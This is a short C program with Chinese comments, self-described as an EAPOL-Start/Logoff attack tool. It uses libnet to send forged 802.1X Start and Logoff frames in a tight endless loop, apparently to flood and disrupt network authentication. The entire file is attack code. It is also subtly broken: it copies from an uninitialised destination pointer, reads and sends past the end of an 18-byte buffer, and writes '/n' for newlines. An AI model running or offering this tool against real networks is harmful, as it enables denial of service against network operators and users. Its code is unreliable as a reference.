#include <stdio.h>
#include <libnet.h>
#include <pcap.h>


#define ETH_ADDR_LEN  6
#define EAPOL_START   1
#define EAPOL_LOGOFF  2


typedef unsigned char u_char;
libnet_t *l = NULL;

//得到本地网卡的mac地址
u_char *get_src_mac()
{
    u_char *ret_mac=NULL;
    struct libnet_ether_addr *e;
    e = libnet_get_hwaddr(l);
    ret_mac = (u_char *)malloc(ETH_ADDR_LEN);/*分配一块mac地址的存储单元*/
    memcpy(ret_mac, e->ether_addr_octet, ETH_ADDR_LEN);
    return (u_char *)ret_mac;
}


//构造EAPOL-Start和EAPOL-Logoff报文的函数,
//当stst的值为EAPOL_START时构造EAPOL-Start报文,
//当stst的值为EAPOL_LOGOFF时构造的是EAPOL-Logoff函数。
u_char *eapol_create_start_stop_frame(char stst)
{
    u_char static * eapol_start;
    u_char *src_addr;

    u_char* eapol_dst;

    eapol_start = (u_char *)malloc(18);  //为EAPOL-START报文分配18字节的空间
    memcpy(eapol_start, eapol_dst, 6); // 拷贝目的地址
    src_addr = get_src_mac();
    memcpy(&eapol_start[6], src_addr, 6);  //拷贝源地址
    free(src_addr);
    src_addr = NULL;
    eapol_start[12] = 0x88;           // 0x888e 是EAPOL帧类型
    eapol_start[13] = 0x8e;
    eapol_start[14] = 1;                   // EAPOL的版本
    eapol_start[15] = stst;              //定义发送的报文类型
    eapol_start[16] = 0;                   // 没有负载.
    eapol_start[17] = 0;
    return eapol_start;
}

//发送报文的函数,函数的形参是指向一个待发送数据包的指针
char *send_frame(u_char *frame_ptr, int frame_size)
{
    if(frame_ptr[23]==0xcd)
        frame_ptr[23]=0x00;
    int i=0;
    if ((i = libnet_write_link(l,frame_ptr,frame_size)) == -1)
        return ("Error sending frame");
    return NULL;
}
//发送EAPOL-Start报文
void txStart()
{
    printf("send txStart/n");
    u_char *temp;
    temp = eapol_create_start_stop_frame(EAPOL_START);
    if (send_frame(temp, 26) == NULL)
        printf("send eap_start to link./n");
    free(temp);
    temp = NULL;
}

//发送EAPOL-Logoff报文
void txLogoff()
{
    printf("send txLogoff/n");
    u_char *temp;
    temp = eapol_create_start_stop_frame(EAPOL_LOGOFF);
    send_frame(temp, 18);
    free(temp);
    temp = NULL;
}


//EAPOL-Start/Logoff攻击工具的主函数
void main(int argc, char** argv)
{
    char *device=NULL;
    char error_information[LIBNET_ERRBUF_SIZE];
    printf("EAPOL_START攻击开始：/n");
    while (1) {
        l=libnet_init(LIBNET_LINK_ADV,device,error_information);
        txStart();
        usleep(10000);
        txLogoff();
        libnet_destroy(l);
        usleep(10000);
    }
}


